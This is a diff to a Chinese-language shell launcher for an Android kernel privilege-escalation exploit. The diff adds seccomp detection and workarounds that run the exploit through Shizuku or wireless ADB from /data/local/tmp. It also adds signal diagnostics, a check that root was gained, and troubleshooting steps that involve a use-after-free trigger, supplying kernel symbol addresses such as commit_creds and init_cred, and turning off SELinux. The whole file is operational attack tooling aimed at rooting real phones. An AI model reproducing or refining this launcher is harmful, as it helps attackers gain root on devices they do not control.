@@ -318,6 +318,26 @@ else
     ARGS="$USER_ARGS"
 fi
 
+# ── 检查 seccomp ──
+print_msg ""
+SECCOMP=$(grep -i secc /proc/self/status 2>/dev/null)
+if [ -n "$SECCOMP" ]; then
+    SCMODE=$(echo "$SECCOMP" | awk -F: '{gsub(/ /,"",$2); print $2}')
+    case "$SCMODE" in
+        0) print_msg "[*] Seccomp: 关闭 (理想)" ;;
+        1) print_msg "[!] Seccomp: strict 模式 - exploit 大概率被阻止" ;;
+        2) print_msg "[!] Seccomp: filter 模式 - 可能阻止关键系统调用" 
+           print_msg "[!] Termux/Android app 进程受 seccomp 限制"
+           print_msg "[!] exploit 需要 sched_setattr/futex PI 等 syscall, 可能被阻止"
+           print_msg "[!] 症状: 'Bad system call' (SIGSYS)"
+           print_msg "[!] 解决方案:"
+           print_msg "    方案A: 用 Shizuku 获得 shell 权限运行 (无需电脑)"
+           print_msg "    方案B: 用另一台手机通过无线 ADB 推送"
+           print_msg "    方案C: Termux 安装 tsu (需要已 root, 循环依赖)"
+           ;;
+    esac
+fi
+
 # ── 运行 exploit ──
 print_msg ""
 print_msg "============================================"
@@ -326,31 +346,75 @@ print_msg "[*] 命令: $EXPLOIT $ARGS"
 print_msg "============================================"
 print_msg ""
 
-# 运行并保存日志
+# 运行并保存日志 (修正退出码: 用 PIPESTATUS 获取 exploit 的真实退出码)
 "$EXPLOIT" $ARGS 2>&1 | tee "$LOG_FILE"
-EXIT_CODE=$?
+REAL_EXIT=${PIPESTATUS[0]:-$?}
+
+# 诊断信号
+SIGNAL=""
+case "$REAL_EXIT" in
+    139) SIGNAL="SIGSEGV (段错误)" ;;
+    137) SIGNAL="SIGKILL (被杀, 可能 OOM 或 SELinux)" ;;
+    134) SIGNAL="SIGABRT (abort, 断言失败)" ;;
+    136) SIGNAL="SIGSYS (Bad system call, seccomp 阻止了某 syscall)" ;;
+    135) SIGNAL="SIGBUS (总线错误)" ;;
+    143) SIGNAL="SIGTERM (被终止)" ;;
+esac
 
 print_msg ""
 print_msg "============================================"
-if [ $EXIT_CODE -eq 0 ]; then
-    print_msg "[+] EXPLOIT 成功!"
+if [ "$REAL_EXIT" = "0" ]; then
+    # 验证是否真的 root
+    if [ "$(id -u)" = "0" ] 2>/dev/null; then
+        print_msg "[+] EXPLOIT 成功! 已获得 root!"
+        print_msg "[+] 运行 'id' 确认, 'su' 验证"
+    else
+        print_msg "[?] 退出码 0 但未获得 root"
+        print_msg "[?] 可能 exploit 未正确提权"
+    fi
     print_msg "[+] 日志已保存: $LOG_FILE"
 else
-    print_msg "[-] Exploit 失败 (退出码: $EXIT_CODE)"
+    print_msg "[-] Exploit 失败 (退出码: $REAL_EXIT${SIGNAL:+ - $SIGNAL})"
     print_msg "[-] 日志已保存: $LOG_FILE"
     print_msg ""
-    print_msg "故障排除:"
-    print_msg "  1. 先运行 'sh run_boot.sh -t' 确认 UAF 是否触发"
-    print_msg "  2. 如果测试模式崩溃重启, 说明漏洞存在"
-    print_msg "  3. 尝试 'sh run_boot.sh -d' 使用 debug 布局"
-    print_msg "  4. 如果 kallsyms 被限制, 手动提供地址:"
-    print_msg "     sh run_boot.sh 0x<commit_creds> 0x<init_cred> 0x<null_fops> 0x<init_task>"
-    print_msg "  5. 检查 SELinux 是否阻止 (setenforce 0 需要 root)"
-    print_msg "  6. 如果当前内核是 ARM64, 改用 run_boot10e.sh"
+    if [ -n "$SIGNAL" ]; then
+        print_msg "信号诊断: $SIGNAL"
+        case "$REAL_EXIT" in
+            136)
+                print_msg "  原因: Android seccomp 过滤器杀死了进程"
+                print_msg "  exploit 调用了被禁止的 syscall (可能是 sched_setattr)"
+                print_msg ""
+                print_msg "  解决方案 (无需电脑):"
+                print_msg "    1. 安装 Shizuku (Play Store / APKMirror)"
+                print_msg "    2. 配合无线 ADB 或配对码激活 Shizuku"
+                print_msg "    3. 用 Shizuku 提供的 shell 运行 exploit"
+                print_msg "  或: 用另一台手机通过无线 ADB 推送到 /data/local/tmp"
+                print_msg "  /data/local/tmp 的进程不受 app seccomp 限制"
+                ;;
+            139)
+                print_msg "  原因: 内存访问错误"
+                print_msg "  可能是内核符号/偏移不匹配"
+                print_msg "  尝试: sh run_boot.sh -d (debug 模式)"
+                ;;
+            137)
+                print_msg "  原因: 被 kill (OOM 或 SELinux)"
+                print_msg "  SELinux: $(cat /sys/fs/selinux/enforce 2>/dev/null)"
+                ;;
+        esac
+    else
+        print_msg "故障排除:"
+        print_msg "  1. 先运行 'sh run_boot.sh -t' 确认 UAF 是否触发"
+        print_msg "  2. 如果测试模式崩溃重启, 说明漏洞存在"
+        print_msg "  3. 尝试 'sh run_boot.sh -d' 使用 debug 布局"
+        print_msg "  4. 如果 kallsyms 被限制, 手动提供地址:"
+        print_msg "     sh run_boot.sh 0x<commit_creds> 0x<init_cred> 0x<null_fops> 0x<init_task>"
+        print_msg "  5. 检查 SELinux 是否阻止 (setenforce 0 需要 root)"
+        print_msg "  6. 如果当前内核是 ARM64, 改用 run_boot10e.sh"
+    fi
     print_msg ""
     print_msg "日志内容:"
-    head -50 "$LOG_FILE" 2>/dev/null
+    cat "$LOG_FILE" 2>/dev/null | head -80
 fi
 print_msg "============================================"
 
-exit $EXIT_CODE
+exit $REAL_EXIT
